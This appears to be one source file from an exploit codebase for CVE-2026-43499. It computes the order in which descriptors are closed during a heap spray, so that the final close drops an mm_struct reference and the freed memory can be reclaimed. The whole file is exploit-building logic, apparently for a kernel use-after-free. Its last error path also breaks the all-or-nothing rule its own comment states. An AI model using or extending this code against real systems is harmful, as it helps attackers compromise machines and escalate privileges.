/** @file memory/reclaim_plan.cpp
 *  The order the retired tree closed in, written as a plan.
 */
#include "backend/cve_2026_43499/memory/reclaim_plan.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    namespace {
        bool put(ReclaimStep *out, std::size_t capacity, std::size_t &at, ReclaimGroup group,
                 std::size_t index) noexcept {
            if (at + 1U > capacity) {
                return false;
            }
            out[at].group = group;
            out[at].index = index;
            ++at;
            return true;
        }
    } // namespace

    ReclaimVerdict plan_reclaim(const ReclaimCounts &counts, ReclaimStep *out, std::size_t capacity,
                                std::size_t &written) noexcept {
        written = 0U;
        /* All or nothing, like every other plan in this layer: on a refusal the caller
         *  must not be able to walk a half-filled list, so the count stays at zero. */
        const auto fail = [&written](ReclaimVerdict verdict) noexcept {
            written = 0U;
            return verdict;
        };
        if (out == nullptr || capacity == 0U) {
            return ReclaimVerdict::NoRoom;
        }
        /* A spray group that cannot be walked one-per-slab is a count nobody can act
         *  on: the rule is about slabs, so a slab size of zero is not a plan. */
        if (counts.spray != 0U && counts.mm_objs_per_slab == 0U) {
            return fail(ReclaimVerdict::CountsInvalid);
        }
        for (std::size_t i = 0U; i < counts.pre; ++i) {
            if (!put(out, capacity, written, ReclaimGroup::Pre, i)) {
                return fail(ReclaimVerdict::NoRoom);
            }
        }
        /* Every post-spray descriptor but the last: the last is the one the reclaim
         *  still needs when the writes happen, which is why it is not in the list. */
        for (std::size_t i = 0U; i + 1U < counts.post; ++i) {
            if (!put(out, capacity, written, ReclaimGroup::Post, i)) {
                return fail(ReclaimVerdict::NoRoom);
            }
        }
        if (counts.mm_objs_per_slab != 0U) {
            for (std::size_t i = 0U; i < counts.spray; i += counts.mm_objs_per_slab) {
                if (!put(out, capacity, written, ReclaimGroup::Spray, i)) {
                    return fail(ReclaimVerdict::NoRoom);
                }
            }
        }
        if (counts.shaped) {
            if (!put(out, capacity, written, ReclaimGroup::Shaping, 0U) ||
                !put(out, capacity, written, ReclaimGroup::Shaping, 1U)) {
                return fail(ReclaimVerdict::NoRoom);
            }
        }
        /* Last, and the reason the plan exists: closing this is what drops the
         *  mm_struct reference the spray depends on. */
        if (!put(out, capacity, written, ReclaimGroup::Leak, 0U)) {
            return ReclaimVerdict::NoRoom;
        }
        return ReclaimVerdict::Ok;
    }
}  // namespace ghostlock::backend::cve_2026_43499::memory
